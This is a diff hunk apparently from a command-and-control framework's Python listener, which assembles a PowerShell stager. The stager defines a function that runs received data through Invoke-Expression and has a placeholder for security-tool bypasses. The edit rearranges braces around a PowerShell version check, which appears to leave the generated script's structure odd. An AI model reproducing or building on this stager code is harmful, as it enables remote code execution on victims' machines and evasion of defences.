@@ -257,15 +257,15 @@ class Listener:
             prestager += "function goForIT ($rdata) {iex $($rdata)};"
             
             if safeChecks.lower() == "true":
-                prestager += "if(-not $PSVersionTable.PSVersion.Major -le 2 -and ($PSVersionTable.PSVersion.Major -eq 3 -or $PSVersionTable.PSVersion.Major -ge 4)){"
+                prestager += "if(-not $PSVersionTable.PSVersion.Major -le 2 -and ($PSVersionTable.PSVersion.Major -eq 3 -or $PSVersionTable.PSVersion.Major -ge 4))"
 
             #for bypass in bypasses:
                 #stager += bypass
 
             if safeChecks.lower() == "true":
-                prestager += "}; [System.Net.ServicePointManager]::Expect100Continue=0;"
+                prestager += "; [System.Net.ServicePointManager]::Expect100Continue=0;{"
 
-            stager = "sleep(3);"
+            stager = "};sleep(3);"
 
             if userAgent.lower() == "default":
                 profile = listenerOptions["DefaultProfile"]["Value"]
